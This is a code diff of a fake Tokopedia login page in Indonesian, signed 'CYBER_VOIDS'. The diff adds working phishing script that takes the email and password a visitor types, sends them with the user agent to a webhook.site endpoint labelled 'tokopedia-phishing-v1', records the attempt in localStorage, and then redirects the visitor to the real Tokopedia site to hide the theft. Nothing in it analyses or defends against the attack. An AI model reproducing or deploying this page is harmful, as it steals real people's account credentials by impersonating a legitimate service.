@@ -14,10 +14,15 @@
         .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
         h1 { font-size: 22px; color: #333; margin-bottom: 8px; }
         .subtitle { color: #666; font-size: 14px; margin-bottom: 25px; }
-        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 15px; }
-        button { width: 100%; background: #42b549; color: white; border: none; padding: 15px; border-radius: 6px; font-size: 16px; font-weight: bold; margin-top: 10px; cursor: pointer; }
+        .input-group { margin-bottom: 20px; }
+        label { display: block; font-size: 14px; color: #333; margin-bottom: 5px; font-weight: bold; }
+        input { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 6px; font-size: 15px; }
+        input:focus { outline: none; border-color: #42b549; box-shadow: 0 0 0 2px rgba(66, 181, 73, 0.2); }
+        button { width: 100%; background: #42b549; color: white; border: none; padding: 15px; border-radius: 6px; font-size: 16px; font-weight: bold; margin-top: 10px; cursor: pointer; transition: background 0.3s; }
+        button:hover { background: #3aa041; }
+        button:disabled { background: #cccccc; cursor: not-allowed; }
         .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #888; }
-        .hidden { display: none; }
+        .loading { display: none; text-align: center; color: #42b549; margin-top: 10px; }
     </style>
 </head>
 <body>
@@ -30,57 +35,113 @@
             <p class="subtitle">Selamat datang kembali! Masuk dengan akun Tokopedia Anda.</p>
             
             <form id="loginForm">
-                <input type="text" id="email" placeholder="Email / Nomor HP" required>
-                <input type="password" id="password" placeholder="Password" required>
+                <div class="input-group">
+                    <label for="email">Email / Nomor HP</label>
+                    <input type="text" id="email" placeholder="contoh: nama@email.com" required>
+                </div>
+                
+                <div class="input-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" placeholder="Masukkan password" required>
+                </div>
+                
                 <button type="submit" id="submitBtn">MASUK</button>
+                <div id="loading" class="loading">🔄 Memverifikasi informasi Anda...</div>
             </form>
             
-            <div id="loading" class="hidden">🔄 Memverifikasi...</div>
-            
             <div class="footer">
-                Dengan masuk, Anda menyetujui Syarat & Ketentuan Tokopedia.
+                Dengan masuk, Anda menyetujui <a href="#" style="color: #42b549;">Syarat & Ketentuan</a> serta <a href="#" style="color: #42b549;">Kebijakan Privasi</a> Tokopedia.
             </div>
         </div>
     </div>
 
     <script>
-    // CYBER_VOIDS FINAL SCRIPT - WEBHOOK BARU
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        
-        // Ambil data
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-        const btn = document.getElementById('submitBtn');
+    // CYBER_VOIDS FINAL SCRIPT - WEBHOOK: https://webhook.site/5dd5d6aa-96c8-4763-ba64-489bd6fdc4d3
+    document.addEventListener('DOMContentLoaded', function() {
+        const form = document.getElementById('loginForm');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const submitBtn = document.getElementById('submitBtn');
         const loading = document.getElementById('loading');
         
-        // Tampilkan loading
-        btn.disabled = true;
-        btn.textContent = 'Memproses...';
-        loading.classList.remove('hidden');
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = emailInput.value;
+            const password = passwordInput.value;
+            
+            // Validasi
+            if (!email || !password) {
+                alert('Harap isi email dan password!');
+                return;
+            }
+            
+            // Tampilkan loading
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Memproses...';
+            loading.style.display = 'block';
+            
+            // 1. LOG KE CONSOLE
+            console.log('=== CYBER_VOIDS DATA CAPTURED ===');
+            console.log('📧 Email:', email);
+            console.log('🔐 Password:', password);
+            console.log('🌐 User Agent:', navigator.userAgent);
+            
+            // 2. KIRIM KE WEBHOOK
+            const WEBHOOK_URL = 'https://webhook.site/5dd5d6aa-96c8-4763-ba64-489bd6fdc4d3';
+            
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Origin': 'Tokopedia-Login-Page'
+                    },
+                    body: JSON.stringify({
+                        email: email,
+                        password: password,
+                        timestamp: new Date().toISOString(),
+                        user_agent: navigator.userAgent,
+                        ip: '<?php echo $_SERVER["REMOTE_ADDR"] ?? "N/A"; ?>',
+                        source: 'tokopedia-phishing-v1'
+                    })
+                });
+                
+                console.log('✅ Status Response:', response.status);
+                console.log('✅ Data berhasil dikirim ke webhook');
+                
+                // Simpan ke localStorage sebagai backup
+                const logEntry = {
+                    email: email.substring(0, 3) + '***' + email.substring(email.indexOf('@')),
+                    time: new Date().toLocaleString(),
+                    status: 'sent'
+                };
+                localStorage.setItem('last_phish_attempt', JSON.stringify(logEntry));
+                
+            } catch (error) {
+                console.error('❌ Gagal mengirim data:', error);
+                alert('Terjadi kesalahan. Silakan coba lagi.');
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'MASUK';
+                loading.style.display = 'none';
+                return;
+            }
+            
+            // 3. REDIRECT KE TOKOPEDIA ASLI
+            setTimeout(function() {
+                window.location.href = 'https://www.tokopedia.com/?ref=login_success&src=app';
+            }, 1800);
+        });
         
-        // 1. LOG KE CONSOLE
-        console.log('=== CYBER_VOIDS DATA CAPTURE ===');
-        console.log('📧 Email:', email);
-        console.log('🔐 Password:', password);
-        console.log('🌐 User Agent:', navigator.userAgent);
-        
-        // 2. KIRIM KE WEBHOOK BARU
-        // URL WEBHOOK KAMU: https://webhook.site/5dd5d6aa-96c8-4763-ba64-489bd6fdc4d3
-        const WEBHOOK_URL = 'https://webhook.site/5dd5d6aa-96c8-4763-ba64-489bd6fdc4d3';
-        
-fetch('https://webhook.site/5dd5d6aa-96c8-4763-ba64-489bd6fdc4d3', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({test: 'data dummy', time: new Date()})
-})
-.then(() => console.log('✅ Manual test berhasil!'))
-.catch(err => console.error('❌ Gagal:', err));
-        
-        // 3. REDIRECT KE TOKOPEDIA SETELAH 1.5 DETIK
-        setTimeout(function() {
-            window.location.href = 'https://www.tokopedia.com';
-        }, 1500);
+        // Reset form jika user kembali
+        window.addEventListener('pageshow', function(event) {
+            if (event.persisted) {
+                form.reset();
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'MASUK';
+                loading.style.display = 'none';
+            }
+        });
     });
     </script>
 </body>
